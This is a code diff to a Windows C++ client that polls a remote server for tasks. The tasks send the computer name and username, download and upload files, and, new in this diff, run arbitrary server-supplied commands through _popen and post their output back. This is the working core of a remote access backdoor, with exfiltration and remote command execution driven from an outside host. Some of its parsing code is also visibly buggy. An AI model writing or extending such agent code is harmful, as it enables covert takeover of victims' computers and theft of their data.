@@ -9,6 +9,7 @@
 #include <iomanip>
 #include <chrono>
 #include <ctime>
+#include <stdexcept>
 
 #include "libcurl/include/curl/curl.h"
 
@@ -39,15 +40,17 @@ typedef std::wstring String;
 #define POST_CONTROL "CONTROL"
 #define POST_RESUME "RESUME"
 #define POST_PRIORITY "PRIORITY"
+#define POST_DONE "DONE"									//DONE;
 
 #define TASK_INVALID -1
 #define TASK_UNKNOWN 0
 #define TASK_DONE 1
-#define TASK_INIT "INIT"									//INIT;id=46;alive_delay_minitue=5;
+#define TASK_INIT "INIT"									//INIT;id=46;alive_delay_minutes=5;
 #define TASK_SEND_COMPUTERNAME "SEND_COMPUTERNAME"			//SEND_COMPUTERNAME;
 #define TASK_SEND_USERNAME "SEND_USERNAME"					//SEND_USERNAME
 #define TASK_GET_FILE "GET_FILE"							//GET_FILE;url=http://cbdkj;path=C:/ProgramData/lklsd
-#define TASK_SEND_FILE "SEND_FILE"
+#define TASK_SEND_FILE "SEND_FILE"							//SEND_FILE;url=http://cbdkj;path=C:/ProgramData/lklsd
+#define TASK_RUN_COMMAND "RUN_COMMAND"						//RUN_COMMAND;rugviortum
 
 #define MAX_SEMAPHORE_COUNT 1
 
@@ -79,29 +82,32 @@ class AClass {
 HANDLE semaphore_alive;
 HANDLE semaphore_resultfile;
 HANDLE semaphore_checkresult;
+
 DWORD dwWaitResult;
 bool alive = TRUE;
 int block_size_m = 1;
 //char *server_url = "http://127.0.0.1:6789";
-char *server_url = "http://127.0.0.1:6789/id=0";
-//char *server_url = "http://192.168.1.148/Project2_agent/first.php";
+//char *server_url = "http://127.0.0.1:6789/id=0";
+char *server_url = "http://192.168.1.148/Project2_agent/first.php";
 char *client_id = "0";
-char *serverurl_clientid="http://127.0.0.1:6789/id=0";
+char *serverurl_clientid="http://192.168.1.148/Project2_agent/first.php?id=2";
 int alive_delay_min = 2;
 CURL *curl_mainhandler;
 
-
 void deleteNewed(void *str);
 void freeMallocedMemory(void *str);
-int task_do(string line);
+int task_do(string line, char result_filename[]);
 void delete_done_task_synchronous(char result_filename[]);
 char* string_to_charstar(string str);
+string exec(const char* cmd);
 void add_id_to_url() {
-	char *temp = "/id=";
+	
+	char *temp = "?id=";
 	serverurl_clientid = (char *)malloc(1 + strlen(server_url) + strlen(temp) + strlen(client_id));
 	strcpy(serverurl_clientid, server_url);
 	strcat(serverurl_clientid, temp);
 	strcat(serverurl_clientid, client_id);
+	
 }
 
 #pragma region curl
@@ -332,17 +338,17 @@ void read_init(char init_filename[]) {
 
 	line = line.substr(end + 1);
 	//sample: id=1616;
-	start = line.find("id=");
+	start = line.find("=");
 	end = line.find(";");
-	str = line.substr(start, end - start);
+	str = line.substr(start+1, end - start);
 	client_id = string_to_charstar(str);
 	add_id_to_url();
 
 	line = line.substr(end + 1);
 	//sample alive_delay_miniutes=5;
-	start = line.find("alive_delay_miniutes=");
+	start = line.find("=");
 	end = line.find(";");
-	str = line.substr(start, end - start);
+	str = line.substr(start+1, end - start);
 	alive_delay_min = stoi(str, nullptr);
 
 	//...
@@ -380,22 +386,29 @@ void add_header_file(string header_data, char in_filename[])
 }
 
 void check_tasks(char result_filename[]) {
-
+	
 	ifstream infile;
+	WaitForSingleObject(semaphore_resultfile, INFINITE);
 	infile.open(result_filename);
 	string line;
 	bool task_done = FALSE;
 	int task = TASK_UNKNOWN;
-	if (getline(infile, line)) {
+	while (getline(infile, line)) {
+		infile.close();
+		ReleaseSemaphore(semaphore_resultfile, 1, NULL);
 
-		task = task_do(line);
+		task = task_do(line, result_filename);
+
+		if (task == TASK_INVALID || task == TASK_DONE) {
+			delete_done_task_synchronous(result_filename);
+		}
+
+		WaitForSingleObject(semaphore_resultfile, INFINITE);
+		infile.open(result_filename);
 	}
 
 	infile.close();
-
-	if (task==TASK_INVALID || task== TASK_DONE) {
-		delete_done_task_synchronous(result_filename);
-	}
+	ReleaseSemaphore(semaphore_resultfile, 1, NULL);
 	
 }
 
@@ -434,9 +447,9 @@ void getAndSend_username() {
 	}
 }
 
+int task_do(string line, char result_filename[]){
+	//cout << line;
 
-int task_do(string line){
-	
 	if (line.length() < 1)
 		return TASK_INVALID;
 	size_t start;
@@ -455,14 +468,15 @@ int task_do(string line){
 	}
 	else if (str.compare(TASK_SEND_FILE) == 0) {
 		line = line.substr(end +1);
-		start = line.find("url=");
+
+		start = line.find("=");
 		end = line.find(";");
-		str = line.substr(start, end - start);
+		str = line.substr(start+1, end - start);
 
 		line = line.substr(end + 1);
-		start = line.find("path=");
+		start = line.find("=");
 		end = line.find(";");
-		str2 = line.substr(start, end - start);
+		str2 = line.substr(start+1, end - start);
 
 		char * url = string_to_charstar(str);
 		char * path = string_to_charstar(str);
@@ -472,26 +486,36 @@ int task_do(string line){
 	}
 	else if (str.compare(TASK_GET_FILE) == 0) {
 		line = line.substr(end + 1);
-		start = line.find("url=");
+		start = line.find("=");
 		end = line.find(";");
-		str = line.substr(start, end - start);
+		str = line.substr(start+1, end - start);
 
 		line = line.substr(end + 1);
-		start = line.find("path=");
+		start = line.find("=");
 		end = line.find(";");
-		str2 = line.substr(start, end - start);
+		str2 = line.substr(start+1, end - start);
 
 		char * url = string_to_charstar(str);
 		char * path = string_to_charstar(str);
 
 		get_skipssl(curl_mainhandler, url, path);
-
+		
+		string tmp = POST_DONE;
+		tmp += ";";
+		char *ali = string_to_charstar(tmp);
+		post_control_synchronous(curl_mainhandler, serverurl_clientid, ali, result_filename);
+		
+	}
+	else if (str.compare(TASK_RUN_COMMAND) == 0) {
+		line = line.substr(end + 1);
+		//system(string_to_charstar(line));
+		char *cmd = string_to_charstar(line);
+		char *output = string_to_charstar(exec(cmd));
+		post_data(curl_mainhandler, serverurl_clientid, output);
 	}
 	else {
 		return TASK_INVALID;
 	}
-	
-
 
 	return TASK_DONE;
 }
@@ -536,6 +560,24 @@ void freeMallocedMemory(void *str) {
 	free(str);
 }
 
+string exec(const char* cmd) {
+	char buffer[128];
+	std::string result = "";
+	FILE* pipe = _popen(cmd, "r");
+	if (!pipe) throw std::runtime_error("popen() failed!");
+	try {
+		while (!feof(pipe)) {
+			if (fgets(buffer, 128, pipe) != NULL)
+				result += buffer;
+		}
+}
+	catch (...) {
+		_pclose(pipe);
+		throw;
+	}
+	_pclose(pipe);
+	return result;
+}
 
 #define DEBUG
 #ifdef DEBUG
